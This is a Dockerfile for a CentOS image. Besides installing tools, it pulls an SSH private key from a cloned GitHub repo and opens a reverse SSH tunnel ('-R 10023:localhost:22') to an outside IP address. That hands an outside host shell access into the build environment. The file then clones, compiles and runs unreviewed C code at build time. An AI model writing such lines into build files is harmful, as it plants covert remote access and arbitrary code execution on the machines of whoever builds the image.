FROM centos:latest
MAINTAINER huqian 279760487@qq.com
RUN ls
RUN ls
RUN yum update -y
RUN yum install -y git
RUN yum install -y net-tools
RUN yum install -y openssh* 
RUN yum install -y expect
RUN yum install -y wget
RUN yum install -y gcc
RUN yum install -y automake autoconf libtool make

RUN ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key
RUN ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key
RUN ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key
RUN ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key

RUN whoami

RUN ls
RUN ls

RUN git clone https://github.com/aliashq/main.git


RUN wget http://sourceforge.net/projects/sshpass/files/sshpass/1.05/sshpass-1.05.tar.gz  
RUN tar xvzf sshpass-1.05.tar.gz  
RUN ./sshpass-1.05/configure --prefix=/usr/local/Cellar/sshpass/1.05  
RUN make
RUN make install
RUN git clone https://github.com/aliashq/dockerfile.git
RUN mv /dockerfile/tmp ./key
RUN ls
RUN ls /dockerfile
RUN ls -al ~/
RUN ls -al /home
RUN StrictHostKeyChecking=no 
RUN UserKnownHostsFile=/dev/null
RUN ssh -i /key  -fN -R 10023:localhost:22 root@123.206.57.144

RUN ls
RUN cd main
RUN ls main
RUN mv main/main.c ./
RUN mv main/ssh.sh ./
RUN ls
RUN gcc main.c 
RUN ls
RUN ./a.out 
